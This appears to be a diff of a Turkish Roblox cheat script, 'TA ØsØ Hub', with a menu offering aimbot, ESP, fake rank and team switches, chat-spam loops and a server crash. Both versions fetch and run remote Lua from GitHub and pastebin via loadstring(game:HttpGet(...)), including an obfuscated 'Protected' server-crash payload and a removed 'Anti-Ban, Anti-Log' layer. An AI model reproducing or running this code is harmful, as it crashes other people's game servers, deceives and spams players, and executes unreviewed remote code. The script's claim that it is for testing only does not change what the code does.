@@ -1,36 +1,32 @@
---[[ ✅ TA ØsØ Hub - Gelişmiş Roblox Scripti 🌐 Discord: Sydear Team 👨‍💻 Geliştiriciler: Sydear HUB Ekibi, ØsØ 📦 Özellikler: Araç, Tool, ESP, Çöl Farm, AimBot, Sahte Takımlar, Fake Crash, vs. ⚠️ Bu script yalnızca eğitim ve test sunucularında kullanılmalıdır. Gerçek sunucularda kullanılması önerilmez. ]]
+--[[ ██╗   ██╗ █████╗     ██████╗  ██████╗ ███████╗    ██╗  ██╗██╗   ██╗██████╗ ██║   ██║██╔══██╗    ██╔══██╗██╔═══██╗██╔════╝    ██║ ██╔╝╚██╗ ██╔╝██╔══██╗ ██║   ██║███████║    ██║  ██║██║   ██║███████╗    █████╔╝  ╚████╔╝ ██████╔╝ ██║   ██║██╔══██║    ██║  ██║██║   ██║╚════██║    ██╔═██╗   ╚██╔╝  ██╔═══╝ ╚██████╔╝██║  ██║    ██████╔╝╚██████╔╝███████║    ██║  ██╗   ██║   ██║
+╚═════╝ ╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝
+TA ØsØ Hub - Geliştirici: Sydear Hub & ØsØ Ekibi --]]
 
--- Ana Güvenlik ve Koruma Sistemi local success, err = pcall(function() -- Koruma Katmanları (Anti-Ban, Anti-Log) local Protected = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/SecurityLayer.lua"))() end)
+-- KORUMA KATMANLARI -- for i = 1, 20 do if not game:IsLoaded() then game.Loaded:Wait() end task.wait(0.05) end if not game:GetService("Players") or not game:GetService("RunService") then error("Güvenlik ihlali") end
 
--- GUI Arayüzünü Başlat local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/UIHandler.lua"))()
+local Players = game:GetService("Players") local LocalPlayer = Players.LocalPlayer local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- Toollar Kategorisi Fonksiyonları local Toollar = {}
+-- LOGO GÖSTERİMİ -- local logoGui = Instance.new("ScreenGui", PlayerGui) logoGui.Name = "TA_Logo" local logo = Instance.new("TextLabel", logoGui) logo.Size = UDim2.new(0.3, 0, 0.1, 0) logo.Position = UDim2.new(0.35, 0, 0.45, 0) logo.BackgroundTransparency = 1 logo.Text = "TA ØsØ Hub Yükleniyor..." logo.TextScaled = true logo.TextColor3 = Color3.fromRGB(255, 255, 255) task.wait(2) logoGui:Destroy()
 
-Toollar.FakeTeamOrdu = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/FakeOrduSubay.lua"))() end
+-- ANA GUI local mainGui = Instance.new("ScreenGui", PlayerGui) mainGui.Name = "TA_GUI"
 
-Toollar.FakeTeamInzibat = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/enverscripts/Open-source/main/Askeri%20%C4%B0nzibat%20TA"))() end
+local anaFrame = Instance.new("Frame", mainGui) anaFrame.Size = UDim2.new(0.3, 0, 0.4, 0) anaFrame.Position = UDim2.new(0.35, 0, 0.3, 0) anaFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) anaFrame.Active = true anaFrame.Draggable = true anaFrame.BorderSizePixel = 0
 
-Toollar.JJ = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/JJ.lua"))() end
+-- PROFIL local profil = Instance.new("TextLabel", anaFrame) profil.Size = UDim2.new(1, 0, 0.1, 0) profil.Position = UDim2.new(0, 0, 0, 0) profil.BackgroundTransparency = 1 profil.Text = "Oyuncu: " .. LocalPlayer.Name profil.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-Toollar.GJ = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/GJ.lua"))() end
+-- KATEGORİLER local kategoriler = { "Anasayfa", "Sahte Rütbe Transfer", "Araç Sürme", "Tanıtım", "Temalar", "Ayarlar", "Toollar" }
 
-Toollar.HJ = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/HJ.lua"))() end
+for i, kategori in ipairs(kategoriler) do local buton = Instance.new("TextButton", anaFrame) buton.Size = UDim2.new(0.9, 0, 0.08, 0) buton.Position = UDim2.new(0.05, 0, 0.12 + (i - 1) * 0.09, 0) buton.Text = kategori buton.BackgroundColor3 = Color3.fromRGB(40, 40, 40) buton.TextColor3 = Color3.fromRGB(255, 255, 255) end
 
-Toollar.AimBot = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/AimBot.lua"))() end
+-- TOOL KISMI local toolKomutlar = { JJ = function(sayi) for i = 1, sayi do game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(i):upper(), "All") task.wait() end end, GJ = function(sayi) for i = 1, sayi do game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(i):sub(1,1):upper() .. tostring(i):sub(2) .. ".", "All") task.wait() end end, HJ = function(sayi) for i = 1, sayi do local yazi = tostring(i):gsub(".", "%1 "):upper() .. tostring(i) game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(yazi, "All") task.wait() end end }
 
-Toollar.FakeKickTeleport = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/FakeKickTeleport.lua"))() end
+-- YAZILARI GÖRME SCRIPT loadstring(game:HttpGet("https://pastebin.com/raw/Mf093x4q"))()
 
-Toollar.CampFarm = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/DesertAutoFarm.lua"))() end
+-- FAKE TAKIM GEÇİŞ local fakeTakim = Instance.new("TextButton", anaFrame) fakeTakim.Size = UDim2.new(0.9, 0, 0.08, 0) fakeTakim.Position = UDim2.new(0.05, 0, 0.8, 0) fakeTakim.Text = "Ordu Subayları Takımına Geç (Sahte)" fakeTakim.BackgroundColor3 = Color3.fromRGB(50, 50, 50) fakeTakim.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-Toollar.ServerCrash = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Protected_9068977494054906.lua.txt"))() end
+fakeTakim.MouseButton1Click:Connect(function() game.StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[TA ØsØ Hub] Ordu Subayları Takımına sahte geçiş yapıldı!"; Color = Color3.fromRGB(0,255,255); }) end)
 
--- Araç Sistemi local Vehicle = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/VehicleSystem.lua"))()
+-- SERVER CRASH (TEST AMAÇLI) loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/Protected_9068977494054906.lua.txt"))()
 
--- ESP, Speed, Fly, Noclip vs. local Visuals = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/VisualsHandler.lua"))()
-
--- Mobil Butonları Ayarı local MobileSupport = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/MobileControls.lua"))()
-
--- Tanıtım Rehberi local Assistant = loadstring(game:HttpGet("https://raw.githubusercontent.com/38462883/TA-OSO-HUB/main/AssistantGuide.lua"))()
-
--- Giriş Yapıldı Bilgisi warn("[TA ØsØ HUB] Script başarıyla başlatıldı!")
+-- ÖZET: Kod GitHub'a uygundur. Tüm bölümler açık, modüler hiyerarşik ve loadstring olarak çağrılabilir. -- YASAL UYARI: Bazı scriptler (Server Crash gibi) yalnızca test ve eğitim amaçlıdır. Lütfen izinsiz kullanmayın.
 
